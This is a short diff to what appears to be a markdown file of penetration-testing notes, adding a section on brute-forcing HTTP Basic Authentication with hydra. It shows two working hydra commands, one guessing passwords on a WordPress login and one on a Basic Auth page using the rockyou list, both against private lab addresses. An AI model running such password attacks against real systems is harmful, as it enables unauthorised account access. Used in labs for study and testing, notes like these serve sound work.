@@ -27,3 +27,9 @@ eg
 ```bash
 hydra -vV -l elliot -P password-list 192.168.56.115 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
 ```
+
+## brute force HTTP Basic Authentication
+
+```
+hydra -l admin -P ~/rockyou.txt -s 80 -f 192.168.196.201 http-get /
+```
